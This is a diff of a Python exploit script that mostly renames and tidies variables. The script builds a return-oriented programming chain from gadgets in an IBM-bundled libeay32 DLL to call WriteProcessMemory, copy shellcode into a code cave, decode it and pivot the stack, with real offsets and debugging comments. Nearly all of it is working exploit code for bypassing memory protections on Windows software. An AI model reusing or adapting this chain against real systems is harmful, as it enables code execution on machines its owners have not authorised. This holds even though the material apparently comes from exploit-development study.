@@ -425,10 +425,10 @@ def main():
         # Target Function Offset observed from loading the dll in IDA was noted
         functionOffset = 0x14E0
 
-        libraryBase = exportedFunc - functionOffset
+        base_addr_libeay32ibm = exportedFunc - functionOffset
         print(
             Fore.GREEN
-            + f"o Calculated library base via\n\t\t {functions[0].decode("utf-8")}: {Fore.LIGHTYELLOW_EX}{str(hex(libraryBase))}"
+            + f"o Calculated library base via\n\t\t {functions[0].decode("utf-8")}: {Fore.LIGHTYELLOW_EX}{str(hex(base_addr_libeay32ibm))}"
             + Style.RESET_ALL
         )
 
@@ -456,12 +456,12 @@ def main():
         #        which is why the offset is lower than 0x92c04
         #        (0x880B0)
         wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
-        wpm += pack("<L", (libraryBase + 0x92C04))  # Shellcode Return Address
+        wpm += pack("<L", (base_addr_libeay32ibm + 0x92C04))  # Shellcode Return Address
         wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
-        wpm += pack("<L", (libraryBase + 0x92C04))  # Code cave address
+        wpm += pack("<L", (base_addr_libeay32ibm + 0x92C04))  # Code cave address
         wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
         wpm += pack("<L", (0x42424242))  # dummy nSize
-        wpm += pack("<L", (libraryBase + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
+        wpm += pack("<L", (base_addr_libeay32ibm + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
         wpm += b"A" * 0x10
 
         offset = b"A" * (276 - len(wpm))
@@ -479,8 +479,8 @@ def main():
         #
         # IGNORE THE ABOVE. REASON:
         #                         restarting the PC gave me a new base address and so now it works as expected
-        # eip = pack("<L", (libraryBase + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
-        eip = pack("<L", (libraryBase + 0x000408D6))  # (0x030d08d6) push esp; pop esi; ret <- Save ESP to ESI
+        # eip = pack("<L", (base_addr_libeay32ibm + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
+        eip = pack("<L", (base_addr_libeay32ibm + 0x000408D6))  # (0x030d08d6) push esp; pop esi; ret <- Save ESP to ESI
         # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI
 
         # ! DEBUG: eip: 0x030d08d6
@@ -491,21 +491,27 @@ def main():
         # DD 0D 08 D6   <- this broke the flow, got 00 00 08 D6
 
         # eip = pack("<L", (0xDD0D08D6))  # push esp; pop esi; ret <- Save ESP to ESI
-        print(f"{Fore.GREEN}! DEBUG: eip: {hex(libraryBase + 0x408D6)}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}! DEBUG: eip: {hex(base_addr_libeay32ibm + 0x408D6)}{Style.RESET_ALL}")
 
         """
         ************************************************************************************
         ******************************* Stage 0: ROP Gadgets *******************************
         ************************************************************************************
         """
-        rop_inc_eax_ret = pack("<L", (libraryBase + 0xBC79))  # inc eax; ret
-        rop_pop_eax_ret = pack("<L", (rop_pop_eax_ret))  # pop eax; ret
-        rop_pop_ecx_ret = pack("<L", (libraryBase + 0x117C))  # pop ecx; ret
-        rop_add_eax_ecx_ret = pack("<L", (libraryBase + 0x1D0F0))  # add eax, ecx; ret
-        rop_mov_pEAX_ecx_ret = pack("<L", (libraryBase + 0x1FD8))  # mov [eax], ecx ; ret
-        rop_mov_eax_esi_pop_esi_ret = pack("<L", (libraryBase + 0x296F))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
-        rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010 = pack("<L", (libraryBase + 0x8876D))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
-
+        rop_inc_eax_ret = pack("<L", (base_addr_libeay32ibm + 0x0000BC79))  # inc eax; ret
+        rop_pop_ecx_ret = pack("<L", (base_addr_libeay32ibm + 0x0000117C))  # pop ecx; ret
+        rop_neg_eax_ret = pack("<L", (base_addr_libeay32ibm + 0x0001D8C2))  # neg eax ; ret
+        rop_pop_eax_ret = pack("<L", (base_addr_libeay32ibm + 0x00048DB7))  # pop eax; ret
+        rop_add_eax_ecx_ret = pack("<L", (base_addr_libeay32ibm + 0x0001D0F0))  # add eax, ecx; ret
+        rop_xchg_eax_esp_ret = pack("<L", (base_addr_libeay32ibm + 0x0003A003))  # xchg eax, esp ; ret
+        rop_mov_ptrEAX_ecx_ret = pack("<L", (base_addr_libeay32ibm + 0x00001F7E))  # mov [eax], ecx ; ret
+        rop_push_eax_pop_esi_ret = pack("<L", (base_addr_libeay32ibm + 0x000408DD))  # push eax; pop esi; ret
+        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (base_addr_libeay32ibm + 0x0004A7B6))  # sub eax, ecx; pop ebx; ret
+        rop_mov_eax_esi_pop_esi_ret = pack("<L", (base_addr_libeay32ibm + 0x000025B7))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
+        rop_add_ptrEAX_1_bh_ret = pack("<L", (base_addr_libeay32ibm + 0x00001E8D))  # add [eax+1], bh; ret
+        rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010 = pack(
+            "<L", (base_addr_libeay32ibm + 0x0008876D)
+        )  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
         """
         ************************************************************************************
         ***************************** Stage 1a: Patch lpBuffer *****************************
@@ -513,16 +519,16 @@ def main():
         """
 
         # Patching lpBuffer, need it to point to our shellcode address on stack
-        rop = pack("<L", (rop_mov_eax_esi_pop_esi_ret))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
+        rop = rop_mov_eax_esi_pop_esi_ret  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
         rop += pack("<L", (0x42424242))  # dummy value
-        rop += pack("<L", (rop_pop_ecx_ret))  # pop ecx; ret
+        rop += rop_pop_ecx_ret  # pop ecx; ret
         rop += pack("<L", (0x88888888))  # push huge value to "subtract"
         rop += pack(
             "<L", (rop_add_eax_ecx_ret)
         )  # add eax, ecx; ret -> this will set lpBuffer to point to our shellcode on the stack (EAX - 0x77777D78)
-        rop += pack("<L", (rop_pop_ecx_ret))  # pop ecx; ret
+        rop += rop_pop_ecx_ret  # pop ecx; ret
         rop += pack("<L", (0x77777D78))
-        rop += pack("<L", (rop_add_eax_ecx_ret))  # add eax, ecx; ret
+        rop += rop_add_eax_ecx_ret  # add eax, ecx; ret
 
         """
         ************************************************************************************
@@ -530,16 +536,16 @@ def main():
         ************************************************************************************
         """
         # 1603_0303:
-        rop += pack("<L", (rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+        rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
         rop += pack("<L", (0x42424242))  # junk into esi
-        rop += pack("<L", (rop_pop_eax_ret))  # pop eax ; ret
+        rop += rop_pop_eax_ret  # pop eax ; ret
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
         rop += pack("<L", (0xFFFFFEE0))  # pop into eax
-        rop += pack("<L", (rop_add_eax_ecx_ret))  # add eax, ecx ; ret
-        rop += pack("<L", (rop_mov_pEAX_ecx_ret))  # mov [eax], ecx ; ret
+        rop += rop_add_eax_ecx_ret  # add eax, ecx ; ret
+        rop += rop_mov_ptrEAX_ecx_ret  # mov [eax], ecx ; ret
 
         """ 
         ************************************************************************************
@@ -548,18 +554,18 @@ def main():
         """
         # 1803_1046:
         # Patching nSize arg
-        rop += pack("<L", (rop_inc_eax_ret))  # inc eax; ret
-        rop += pack("<L", (rop_inc_eax_ret))  # inc eax; ret
-        rop += pack("<L", (rop_inc_eax_ret))  # inc eax; ret
-        rop += pack("<L", (rop_inc_eax_ret))  # inc eax; ret
-        rop += pack("<L", (libraryBase + 0x408DD))  # push eax; pop esi; ret
-        rop += pack("<L", (rop_pop_eax_ret))  # pop eax; ret
+        rop += rop_inc_eax_ret  # inc eax; ret
+        rop += rop_inc_eax_ret  # inc eax; ret
+        rop += rop_inc_eax_ret  # inc eax; ret
+        rop += rop_inc_eax_ret  # inc eax; ret
+        rop += rop_push_eax_pop_esi_ret  # push eax; pop esi; ret
+        rop += rop_pop_eax_ret  # pop eax; ret
         rop += pack("<L", (0xFFFFFDF4))  # -524
-        rop += pack("<L", (libraryBase + 0x1D8C2))  # neg eax ; ret
-        rop += pack("<L", (rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+        rop += rop_neg_eax_ret  # neg eax ; ret
+        rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
         rop += pack("<L", (0x42424242))  # junk into esi
-        # rop += pack("<L", (libraryBase + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
-        rop += pack("<L", (rop_mov_pEAX_ecx_ret))  # mov [eax], ecx ; ret
+        # rop += pack("<L", (base_addr_libeay32ibm + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
+        rop += rop_mov_ptrEAX_ecx_ret  # mov [eax], ecx ; ret
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
@@ -570,11 +576,11 @@ def main():
         *************************** Stage 1d: Shellcode Decoding ***************************
         ************************************************************************************
         """
-        rop += pack("<L", (libraryBase + 0x117C))  # pop ecx ; ret
+        rop += rop_pop_ecx_ret  # pop ecx ; ret
         rop += pack("<L", (0xFFFFFFFF))  # pop ecx ; ret
-        rop += pack("<L", (libraryBase + 0x4A7B6))  # sub eax, ecx; pop ebx; ret
+        rop += rop_sub_eax_ecx_pop_ebx_ret  # sub eax, ecx; pop ebx; ret
         rop += pack("<L", (0x11110111))  # Load 0x01 in BH
-        rop += pack("<L", (libraryBase + 0x468EE))  # add [eax+1], bh; ret
+        rop += rop_add_ptrEAX_1_bh_ret  # add [eax+1], bh; ret
 
         """
         ************************************************************************************
@@ -585,10 +591,10 @@ def main():
         # Align ESP with ROP Skeleton
         # EAX points 0x14 bytes ahead of WPM on stack
         # This will jump EIP back straight up towards the WPM address call
-        rop += pack("<L", (libraryBase + 0x117C))  # pop ecx ; ret
+        rop += rop_pop_ecx_ret  # pop ecx ; ret
         rop += pack("<L", (0xFFFFFFEC))  # -0x14
-        rop += pack("<L", (rop_add_eax_ecx_ret))  # add eax, ecx ; ret
-        rop += pack("<L", (libraryBase + 0x5B415))  # xchg eax, esp ; ret
+        rop += rop_add_eax_ecx_ret  # add eax, ecx ; ret
+        rop += rop_xchg_eax_esp_ret  # xchg eax, esp ; ret
 
         """
         ************************************************************************************
